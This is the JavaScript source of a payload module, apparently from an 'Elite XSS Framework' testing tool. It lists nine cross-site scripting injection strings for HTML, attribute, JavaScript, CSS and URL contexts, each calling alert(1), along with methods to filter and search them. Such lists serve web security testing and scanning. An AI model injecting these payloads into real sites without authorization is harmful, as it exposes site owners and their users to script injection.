/**
 * Elite XSS Framework - Base Payloads
 * 
 * Core payload library for the Elite XSS Framework.
 */

class BasePayloads {
    constructor() {
        this.payloads = [];
    }

    /**
     * Initialize base payloads
     */
    init() {
        console.log('[Elite XSS] Base payloads initialized');
        this.loadPayloads();
    }

    /**
     * Load base payload library
     */
    loadPayloads() {
        this.payloads = [
            // Basic HTML context payloads
            {
                id: 'basic_script',
                name: 'Basic Script Tag',
                payload: '<script>alert(1)</script>',
                context: 'html',
                severity: 'high',
                description: 'Basic script tag execution'
            },
            {
                id: 'img_onerror',
                name: 'Image OnError',
                payload: '<img src=x onerror=alert(1)>',
                context: 'html',
                severity: 'high',
                description: 'Image tag with onerror event handler'
            },
            {
                id: 'svg_onload',
                name: 'SVG OnLoad',
                payload: '<svg onload=alert(1)>',
                context: 'html',
                severity: 'high',
                description: 'SVG tag with onload event handler'
            },
            
            // Attribute context payloads
            {
                id: 'onmouseover_attr',
                name: 'OnMouseOver Attribute',
                payload: '" onmouseover="alert(1)" x="',
                context: 'attribute',
                severity: 'medium',
                description: 'Attribute breaking with mouseover event'
            },
            {
                id: 'onfocus_attr',
                name: 'OnFocus Attribute',
                payload: '" onfocus="alert(1)" autofocus x="',
                context: 'attribute',
                severity: 'medium',
                description: 'Attribute breaking with focus event'
            },
            
            // JavaScript context payloads
            {
                id: 'js_string_break',
                name: 'JavaScript String Break',
                payload: '";alert(1);//',
                context: 'javascript',
                severity: 'high',
                description: 'Breaking out of JavaScript string context'
            },
            {
                id: 'js_comment_break',
                name: 'JavaScript Comment Break',
                payload: '--></script><script>alert(1)</script><!--',
                context: 'javascript',
                severity: 'high',
                description: 'Breaking out of JavaScript comment context'
            },
            
            // CSS context payloads
            {
                id: 'css_expression',
                name: 'CSS Expression',
                payload: 'expression(alert(1))',
                context: 'css',
                severity: 'medium',
                description: 'CSS expression execution (IE)'
            },
            
            // URL context payloads
            {
                id: 'js_uri',
                name: 'JavaScript URI',
                payload: 'javascript:alert(1)',
                context: 'url',
                severity: 'high',
                description: 'JavaScript URI scheme execution'
            }
        ];
    }

    /**
     * Get all base payloads
     * @returns {Array} Base payloads
     */
    getAllPayloads() {
        return [...this.payloads];
    }

    /**
     * Get payloads by context
     * @param {string} context - Target context
     * @returns {Array} Context-specific payloads
     */
    getPayloadsByContext(context) {
        return this.payloads.filter(payload => payload.context === context);
    }

    /**
     * Get payloads by severity
     * @param {string} severity - Target severity
     * @returns {Array} Severity-specific payloads
     */
    getPayloadsBySeverity(severity) {
        return this.payloads.filter(payload => payload.severity === severity);
    }

    /**
     * Add custom payload
     * @param {Object} payload - Payload to add
     */
    addPayload(payload) {
        // Validate payload structure
        if (!payload.id || !payload.payload) {
            console.error('[Elite XSS] Invalid payload structure');
            return;
        }
        
        this.payloads.push({
            id: payload.id,
            name: payload.name || payload.id,
            payload: payload.payload,
            context: payload.context || 'html',
            severity: payload.severity || 'medium',
            description: payload.description || 'Custom payload',
            custom: true
        });
    }

    /**
     * Remove payload by ID
     * @param {string} id - Payload ID
     */
    removePayload(id) {
        this.payloads = this.payloads.filter(payload => payload.id !== id);
    }

    /**
     * Search payloads by keyword
     * @param {string} keyword - Search keyword
     * @returns {Array} Matching payloads
     */
    searchPayloads(keyword) {
        const term = keyword.toLowerCase();
        return this.payloads.filter(payload => 
            payload.id.toLowerCase().includes(term) ||
            payload.name.toLowerCase().includes(term) ||
            payload.payload.toLowerCase().includes(term) ||
            payload.description.toLowerCase().includes(term)
        );
    }
}

// Export for use in other modules
window.BasePayloads = BasePayloads;